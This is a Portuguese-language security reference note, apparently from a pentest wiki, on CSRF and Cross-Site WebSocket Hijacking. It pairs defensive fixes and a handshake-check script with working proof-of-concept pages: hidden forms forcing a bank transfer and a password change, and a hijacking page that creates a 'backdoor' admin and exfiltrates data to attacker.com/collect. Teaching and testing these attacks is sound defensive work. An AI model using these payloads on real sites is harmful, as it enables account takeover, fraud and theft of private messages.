# CSRF & WebSocket Hijacking (CSWSH)

**Tags:** #alto #csrf #websocket #cswsh #sessao
**OWASP:** A01:2021 — Broken Access Control
**CVSS Base:** 7.5 (Alto) → 9.3 (Crítico — WebSocket + comandos admin)

---

## 📖 O que é

**CSRF (Cross-Site Request Forgery):** força a vítima a executar ações indesejadas em uma aplicação onde já está autenticada.

**CSWSH (Cross-Site WebSocket Hijacking):** o browser envia cookies de sessão automaticamente em conexões WebSocket, assim como em requisições HTTP. Se o servidor não valida o header `Origin`, qualquer site pode abrir uma conexão autenticada em nome da vítima.

---

## 🔍 `grep_search` Táticas

```
# CSRF
csrf
csrfToken
X-CSRF-Token
SameSite
Set-Cookie

# WebSocket
new WebSocket(
io.on('connection'
WebSocketServer
ws.Server
WS.Server
socket.io
req.headers.origin   ← verificar se é validado no handler
upgrade
```

---

## 💣 CSRF — Como Funciona

```
1. Vítima faz login em bank.com (tem cookie de sessão válido)
2. Vítima visita evil.com (página controlada pelo atacante)
3. evil.com contém um form que submete para bank.com/transfer
4. Browser inclui automaticamente os cookies de sessão de bank.com
5. Transferência é realizada sem o conhecimento da vítima
```

### PoC de CSRF GET

```html
<!-- Ação via imagem (GET) -->
<img src="http://bank.com/transfer?to=attacker&amount=1000" style="display:none">
```

### PoC de CSRF POST

```html
<form id="csrf-form" action="http://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="attacker_account">
    <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### PoC CSRF com JSON (para APIs REST)

```html
<!-- Funciona se o endpoint aceita text/plain → parser processa como JSON -->
<form action="http://api.target.com/v1/users/1234/password" method="POST" enctype="text/plain">
    <input name='{"password": "hacked", "ignore_me": "' value='test"}'>
</form>
<script>document.forms[0].submit();</script>
```

---

## 💣 Cross-Site WebSocket Hijacking (CSWSH)

**Diferença para CORS:** WebSocket não segue o modelo CORS. Não há preflight. A **única proteção** é a validação manual do header `Origin` no servidor.

### Código Vulnerável

```javascript
// ❌ VULNERÁVEL — aceita qualquer origem
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
    // Sem verificação de req.headers.origin!
    ws.on('message', (message) => {
        processMessage(message);
    });
});
```

### PoC de CSWSH

```html
<!-- evil.html em http://attacker.com -->
<!DOCTYPE html>
<html>
<script>
    // Abrir WebSocket autenticada como a vítima (browser inclui cookies automaticamente)
    const ws = new WebSocket('wss://target.com/ws');
    
    ws.onopen = function() {
        console.log('Conexão estabelecida como a vítima!');
        
        // Ler dados privados
        ws.send(JSON.stringify({ action: 'get_messages' }));
        ws.send(JSON.stringify({ action: 'get_profile' }));
        
        // Em caso de WebSocket com comandos admin:
        ws.send(JSON.stringify({ action: 'create_admin', username: 'backdoor' }));
    };
    
    ws.onmessage = function(event) {
        // Exfiltrar dados recebidos
        const data = event.data;
        fetch('https://attacker.com/collect', { 
            method: 'POST', 
            body: data 
        });
    };
</script>
</html>
```

---

## ✅ Proteções Contra CSRF

### 1. CSRF Token (Synchronizer Token Pattern)

```python
# ✅ Flask-WTF — CSRF token automático
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# Em templates Jinja2:
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
```

```javascript
// ✅ Express com csurf
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});
```

### 2. SameSite Cookie (proteção moderna)

```python
# ✅ SameSite=Strict — cookie não enviado em cross-origin requests
response.set_cookie('session', session_id, samesite='Strict')

# SameSite=Lax — permite GET top-level (menor fricção)
response.set_cookie('session', session_id, samesite='Lax')
```

### 3. Custom Request Header (AJAX)

```javascript
// ✅ APIs REST — verificar header X-Requested-With ou Content-Type
// Browsers não podem enviar headers customizados em cross-origin form submissions
app.post('/api/transfer', (req, res) => {
    if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
        return res.status(403).json({ error: 'CSRF detectado' });
    }
});
```

---

## ✅ Proteção Contra CSWSH

```javascript
// ✅ CORRETO — validar Origin no handshake WebSocket
const ALLOWED_ORIGINS = new Set([
    'https://app.mycompany.com',
    'https://admin.mycompany.com',
]);

const wss = new WebSocket.Server({ 
    port: 8080,
    verifyClient: ({ origin, req }, callback) => {
        if (!ALLOWED_ORIGINS.has(origin)) {
            console.warn(`CSWSH bloqueado: Origin=${origin}`);
            callback(false, 403, 'Forbidden');
            return;
        }
        callback(true);
    }
});
```

---

## 🧪 Verificação de CSWSH

```python
# .tmp/check_cswsh.py
import requests

TARGET = "http://target.com"
WS_ENDPOINT = "/ws"

# Tentar handshake WebSocket com origem maliciosa (via HTTP upgrade check)
EVIL_ORIGIN = "https://attacker.com"

# O browser faz o upgrade, mas podemos simular o header com requests
r = requests.get(f"{TARGET}{WS_ENDPOINT}", 
                 headers={
                     "Origin": EVIL_ORIGIN,
                     "Connection": "Upgrade",
                     "Upgrade": "websocket",
                     "Sec-WebSocket-Version": "13",
                     "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="
                 }, timeout=10)

print(f"Status: {r.status_code}")
print(f"Headers de resposta relevantes:")
for h in ['Access-Control-Allow-Origin', 'Sec-WebSocket-Accept']:
    print(f"  {h}: {r.headers.get(h, '(não presente)')}")

if r.status_code in [101, 200]:
    print("[⚠️ ] WebSocket handshake aceito com origem externa — verificar autenticidade")
elif r.status_code == 403:
    print("[✅] Origem rejeitada com 403 — proteção presente")
```

---

## 🔗 Chain Exploits

```
CSRF em ação de troca de email → email mudado → password reset da vítima → Account takeover
CSRF + ausência de SameSite Strict → todas as ações POST executáveis por terceiros
CSWSH + WebSocket com comandos admin → RCE/Admin takeover via browser da vítima
CSRF em operação financeira → transferência não autorizada → fraude
CSWSH em chat de suporte → leitura de todas as mensagens privadas
XSS + CSRF token roubado → CSRF bypass completo mesmo com proteção
```

---

## 📌 Referências
- [[XSS — Cross-Site Scripting]]
- [[Autenticação & Gestão de Sessão]]
- [[CORS Misconfiguration]]
- [[HTTP Security Headers]]
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger WebSocket Security](https://portswigger.net/web-security/websockets)
